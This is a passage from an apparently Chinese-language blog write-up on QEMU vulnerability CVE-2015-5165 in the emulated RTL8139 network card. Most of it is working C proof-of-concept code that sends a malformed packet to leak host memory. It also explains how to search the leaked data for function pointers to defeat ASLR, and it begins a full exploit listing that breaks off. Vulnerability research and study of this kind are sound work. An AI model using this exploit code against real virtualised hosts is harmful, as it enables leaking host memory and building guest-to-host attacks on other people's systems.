class="comment">// Total Length = 0x13 = 19 bytes</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x13</span>,     <span class="comment">// 19 - 20 = -1 = 0xFFFF, trigger vulnerability</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xad</span>,     <span class="comment">// Identification</span></span><br><span class="line">    <span class="number">0x40</span>, <span class="number">0x00</span>,     <span class="comment">// Flags &amp; Fragment Offset</span></span><br><span class="line">    <span class="number">0x40</span>,           <span class="comment">// TTL</span></span><br><span class="line">    <span class="number">0x06</span>,           <span class="comment">// Protocol: TCP</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xad</span>,     <span class="comment">// Header checksum</span></span><br><span class="line">    <span class="number">0x7f</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="comment">// Source IP: 127.0.0.1</span></span><br><span class="line">    <span class="number">0x7f</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="comment">// Destination IP: 127.0.0.1</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// IP Packet Payload 数据, 即 TCP 数据包</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xad</span>,     <span class="comment">// Source Port</span></span><br><span class="line">    <span class="number">0xbe</span>, <span class="number">0xef</span>,     <span class="comment">// Destination Port</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="comment">// Sequence Number</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="comment">// Acknowledgement Number</span></span><br><span class="line">    <span class="number">0x50</span>,           <span class="comment">// 01010000, Header Length = 5 * 4 = 20</span></span><br><span class="line">    <span class="number">0x10</span>,           <span class="comment">// 00010000, ACK</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xad</span>,     <span class="comment">// Window Size</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xad</span>,     <span class="comment">// TCP checksum</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>      <span class="comment">// Urgent Pointer</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> get_physical_pfn(<span class="keyword">void</span>* addr) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> pfn = <span class="number">-1</span>;</span><br><span class="line">    FILE* fp = fopen(<span class="string">"/proc/self/pagemap"</span>, <span class="string">"rb"</span>);</span><br><span class="line">    <span class="keyword">if</span> (!fp) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> pfn;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!fseek(fp, (<span class="keyword">unsigned</span> <span class="keyword">long</span>)addr / PAGE_SIZE * <span class="number">8</span>, SEEK_SET)) </span><br><span class="line">    &#123;</span><br><span class="line">        fread(&amp;pfn, <span class="keyword">sizeof</span>(pfn), <span class="number">1</span>, fp);</span><br><span class="line">        <span class="keyword">if</span> (pfn &amp; PFN_PRESENT) </span><br><span class="line">        &#123;</span><br><span class="line">            pfn &amp;= PFN_PFN;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">return</span> pfn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> gva_to_gpa(<span class="keyword">void</span>* addr) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> pfn = get_physical_pfn(addr);</span><br><span class="line">    <span class="keyword">return</span> pfn * PAGE_SIZE + (<span class="keyword">uint64_t</span>)addr % PAGE_SIZE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl8139_desc_config_rx</span><span class="params">(rtl8139_ring* ring, rtl8139_desc* desc, <span class="keyword">size_t</span> nb)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> buffer_size = RTL8139_BUFFER_SIZE + <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; nb; ++i) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memset</span>(&amp;desc[i], <span class="number">0</span>, <span class="keyword">sizeof</span>(desc[i]));</span><br><span class="line">        ring[i].desc = &amp;desc[i];</span><br><span class="line">        </span><br><span class="line">        ring[i].buffer = aligned_alloc(PAGE_SIZE, buffer_size);</span><br><span class="line">        <span class="built_in">memset</span>(ring[i].buffer, <span class="number">0</span>, buffer_size);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// descriptor owned by NIC 准备接收数据</span></span><br><span class="line">        ring[i].desc-&gt;dw0 |= CP_RX_OWN;</span><br><span class="line">        <span class="keyword">if</span> (i == nb - <span class="number">1</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            ring[i].desc-&gt;dw0 |= CP_RX_EOR; <span class="comment">// End of Ring</span></span><br><span class="line">        &#125;</span><br><span class="line">        ring[i].desc-&gt;dw0 &amp;= ~CP_RX_BUFFER_SIZE_MASK;</span><br><span class="line">        ring[i].desc-&gt;dw0 |= buffer_size;   <span class="comment">// buffer_size</span></span><br><span class="line">        ring[i].desc-&gt;buf_lo = (<span class="keyword">uint32_t</span>)gva_to_gpa(ring[i].buffer);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Rx descriptors address</span></span><br><span class="line">    outl((<span class="keyword">uint32_t</span>)gva_to_gpa(desc), RTL8139_PORT + RxRingAddrLO);</span><br><span class="line">    outl(<span class="number">0</span>, RTL8139_PORT + RxRingAddrHI);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl8139_desc_config_tx</span><span class="params">(rtl8139_desc* desc, <span class="keyword">void</span>* buffer)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(desc, <span class="number">0</span>, <span class="keyword">sizeof</span>(rtl8139_desc));</span><br><span class="line">    desc-&gt;dw0 |= CP_TX_OWN |    <span class="comment">// descriptor owned by NIC 准备发送数据</span></span><br><span class="line">                 CP_TX_EOR |</span><br><span class="line">                 CP_TX_LS |</span><br><span class="line">                 CP_TX_LGSEN |</span><br><span class="line">                 CP_TX_IPCS |</span><br><span class="line">                 CP_TX_TCPCS;</span><br><span class="line">    desc-&gt;dw0 += RTL8139_BUFFER_SIZE;</span><br><span class="line">    desc-&gt;buf_lo = (<span class="keyword">uint32_t</span>)gva_to_gpa(buffer);</span><br><span class="line">    outl((<span class="keyword">uint32_t</span>)gva_to_gpa(desc), RTL8139_PORT + TxAddr0);</span><br><span class="line">    outl(<span class="number">0</span>, RTL8139_PORT + TxAddr0 + <span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl8139_card_config</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 触发漏洞需要设置的一些参数</span></span><br><span class="line">    outl(TxLoopBack, RTL8139_PORT + TxConfig);</span><br><span class="line">    outl(AcceptMyPhys, RTL8139_PORT + RxConfig);</span><br><span class="line">    outw(CPlusRxEnb | CPlusTxEnb, RTL8139_PORT + CpCmd);</span><br><span class="line">    outb(CmdRxEnb | CmdTxEnb, RTL8139_PORT + ChipCmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl8139_packet_send</span><span class="params">(<span class="keyword">void</span>* buffer, <span class="keyword">void</span>* packet, <span class="keyword">size_t</span> len)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (len &lt;= RTL8139_BUFFER_SIZE) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(buffer, packet, len);</span><br><span class="line">        outb(CPlus, RTL8139_PORT + TxPoll);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">xxd</span><span class="params">(<span class="keyword">uint8_t</span>* ptr, <span class="keyword">size_t</span> size)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; size; ++i, ++j) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">16</span> == <span class="number">0</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            j = <span class="number">0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\n0x%08x: "</span>, ptr + i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%02x "</span>, ptr[i]);</span><br><span class="line">        <span class="keyword">if</span> (j == <span class="number">7</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"- "</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 44 * RTL8139_BUFFER_SIZE = 44 * 1514 = 66616</span></span><br><span class="line">    <span class="comment">// 可以收完 65535 字节数据</span></span><br><span class="line">    <span class="keyword">size_t</span> rtl8139_rx_nb = <span class="number">44</span>;</span><br><span class="line">    rtl8139_ring* rtl8139_rx_ring = (rtl8139_ring*)aligned_alloc(</span><br><span class="line">        PAGE_SIZE, rtl8139_rx_nb * <span class="keyword">sizeof</span>(struct rtl8139_ring));</span><br><span class="line">    rtl8139_desc* rtl8139_rx_desc = (rtl8139_desc*)aligned_alloc(</span><br><span class="line">        PAGE_SIZE, rtl8139_rx_nb * <span class="keyword">sizeof</span>(struct rtl8139_desc));</span><br><span class="line">    rtl8139_desc* rtl8139_tx_desc = (rtl8139_desc*)aligned_alloc(</span><br><span class="line">        PAGE_SIZE, <span class="keyword">sizeof</span>(struct rtl8139_desc));</span><br><span class="line">    <span class="keyword">void</span>* rtl8139_tx_buffer = aligned_alloc(PAGE_SIZE, RTL8139_BUFFER_SIZE);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// change I/O privilege level</span></span><br><span class="line">    iopl(<span class="number">3</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// initialize Rx ring, Rx descriptor, Tx descriptor</span></span><br><span class="line">    rtl8139_desc_config_rx(rtl8139_rx_ring, rtl8139_rx_desc, rtl8139_rx_nb);</span><br><span class="line">    rtl8139_desc_config_tx(rtl8139_tx_desc, rtl8139_tx_buffer);</span><br><span class="line">    rtl8139_card_config();</span><br><span class="line">    rtl8139_packet_send(rtl8139_tx_buffer, rtl8139_packet, </span><br><span class="line">                        <span class="keyword">sizeof</span>(rtl8139_packet));</span><br><span class="line">    sleep(<span class="number">2</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// print leaked data</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; rtl8139_rx_nb; ++i) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// RTL8139_BUFFER_SIZE 之后 4 字节数据为 Checksum</span></span><br><span class="line">        <span class="comment">// 不打印也无所谓了</span></span><br><span class="line">        xxd((<span class="keyword">uint8_t</span>*)rtl8139_rx_ring[i].buffer, RTL8139_BUFFER_SIZE);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> free heap blocks</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行 PoC 后，在接收到的中间某些数据包中可以看到泄露的数据：</p><p><img src="/uploads/202006/cve-2015-5165-poc.png" alt="QEMU 漏洞 CVE-2015-5165 PoC"></p><h3 id="4-5-漏洞利用"><a href="#4-5-漏洞利用" class="headerlink" title="4.5 漏洞利用"></a>4.5 漏洞利用</h3><p>Phrack 文章 [1] 漏洞利用的思路为：在泄露的数据中搜索保存了 <code>ObjectProperty</code> 对象的堆块（可能是已经被释放的堆块），通过读取 <code>ObjectProperty</code> 对象中保存的函数指针来泄露模块 <code>qemu-system-x86_64</code> 的基地址。</p><p>结构体 <code>ObjectProperty</code> 的定义如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Q_TAILQ_ENTRY(type, qual)                               \</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span>                                                        \</span><br><span class="line">    qual type *tqe_next;        <span class="comment">/* next element */</span>              \</span><br><span class="line">    qual type *qual *tqe_prev;  <span class="comment">/* address of previous next element */</span>\</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QTAILQ_ENTRY(type)       Q_TAILQ_ENTRY(struct type,)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ObjectProperty</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    gchar *name;</span><br><span class="line">    gchar *type;</span><br><span class="line">    gchar *description;</span><br><span class="line">    ObjectPropertyAccessor *get;</span><br><span class="line">    ObjectPropertyAccessor *<span class="built_in">set</span>;</span><br><span class="line">    ObjectPropertyResolve *resolve;</span><br><span class="line">    ObjectPropertyRelease *release;</span><br><span class="line">    <span class="keyword">void</span> *opaque;</span><br><span class="line"></span><br><span class="line">    QTAILQ_ENTRY(ObjectProperty) node;</span><br><span class="line">&#125; ObjectProperty;</span><br></pre></td></tr></table></figure><p>这里 <code>get / set / resolve / release</code> 保存的值均为函数指针。</p><p><strong>利用步骤：</strong></p><ol><li>结构体 <code>ObjectProperty</code> 的大小为 <code>0x50</code> 字节，因此包含 metadata 的堆块的大小为 <code>0x60</code> 字节，可以根据这一信息去搜索泄露的数据中存在的堆块；</li><li>ASLR 不会对地址的低 <code>12</code> 位进行随机化处理，因此可以以相关函数地址的低 <code>12</code> 位为特征进行搜索，以计算出模块 <code>qemu-system-x86_64</code> 的基地址;</li><li>统计泄露的数据中出现的 <code>uint64_t</code> 类型的数据 <code>0x00007FXXYYZZZZZZ</code> ，其中 <code>7FXXYY</code> 出现次数最多的数据，就是 QEMU 虚拟机物理内存的结束地址；</li></ol><p>基于前面的 PoC 代码，笔者重写的一份用于测试 CVE-2015-5165 的完整 Exploit 代码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 页面相关参数</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SHIFT 12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PFN ((1ull &lt;&lt; 55) - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Ethernet Frame 大小</span></span><br><span class="line"><span class="comment">// DST(6) + SRC(6) + Length/Type(2) + PayloadMTU(1500)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RTL8139_BUFFER_SIZE 1514</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// RTL8139 网卡 PMIO 地址</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RTL8139_PORT 0xc000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Rx ownership flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_RX_OWN (1&lt;&lt;31)</span></span><br><span class="line"><span class="comment">// w0 end of ring flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_RX_EOR (1&lt;&lt;30)</span></span><br><span class="line"><span class="comment">// Rx buffer size mask 表示 0 ~ 12 位为 buffer size</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_RX_BUFFER_SIZE_MASK ((1&lt;&lt;13) - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Tx ownership flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_OWN (1&lt;&lt;31)</span></span><br><span class="line"><span class="comment">// Tx end of ring flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_EOR (1&lt;&lt;30)</span></span><br><span class="line"><span class="comment">// last segment of received packet flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_LS (1&lt;&lt;28)</span></span><br><span class="line"><span class="comment">// large send packet flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_LGSEN (1&lt;&lt;27)</span></span><br><span class="line"><span class="comment">// IP checksum offload flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_IPCS (1&lt;&lt;18)</span></span><br><span class="line"><span class="comment">// TCP checksum offload flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_TCPCS (1&lt;&lt;16)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHUNK_COUNT 0x2000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHUNK_SIZE_MASK ~7ull</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// RTL8139 网卡寄存器偏移地址</span></span><br><span class="line"><span class="keyword">enum</span> RTL8139_registers </span><br><span class="line">&#123;</span><br><span class="line">    TxAddr0      = <span class="number">0x20</span>,    <span class="comment">// Tx descriptors address</span></span><br><span class="line">    ChipCmd      = <span class="number">0x37</span>,</span><br><span class="line">    TxConfig     = <span class="number">0x40</span>,</span><br><span class="line">    RxConfig     = <span class="number">0x44</span>,</span><br><span class="line">    TxPoll       = <span class="number">0xD9</span>,    <span class="comment">// tell chip to check Tx descriptors for work</span></span><br><span class="line">    CpCmd        = <span class="number">0xE0</span>,    <span class="comment">// C+ Command register (C+ mode only)</span></span><br><span class="line">    <span class="comment">// 虽然名字写的 RxRingAddr, 但实际上是 Rx descriptor 的地址</span></span><br><span class="line">    RxRingAddrLO = <span class="number">0xE4</span>,    <span class="comment">// 64-bit start addr of Rx descriptor</span></span><br><span class="line">    RxRingAddrHI = <span class="number">0xE8</span>,    <span class="comment">// 64-bit start addr of Rx descriptor</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> RTL_8139_tx_config_bits </span><br><span class="line">&#123;</span><br><span class="line">    TxLoopBack = (<span class="number">1</span> &lt;&lt; <span class="number">18</span>) | (<span class="number">1</span> &lt;&lt; <span class="number">17</span>), <span class="comment">// enable loopback test mode</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> RTL_8139_rx_mode_bits </span><br><span class="line">&#123;</span><br><span class="line">    AcceptErr       = <span class="number">0x20</span>,</span><br><span class="line">    AcceptRunt      = <span class="number">0x10</span>,</span><br><span class="line">    AcceptBroadcast = <span class="number">0x08</span>,</span><br><span class="line">    AcceptMulticast = <span class="number">0x04</span>,</span><br><span class="line">    AcceptMyPhys    = <span class="number">0x02</span>,</span><br><span class="line">    AcceptAllPhys   = <span class="number">0x01</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> RTL_8139_CplusCmdBits </span><br><span class="line">&#123;</span><br><span class="line">    CPlusRxVLAN   = <span class="number">0x0040</span>, <span class="comment">/* enable receive VLAN detagging */</span></span><br><span class="line">    CPlusRxChkSum = <span class="number">0x0020</span>, <span class="comment">/* enable receive checksum offloading */</span></span><br><span 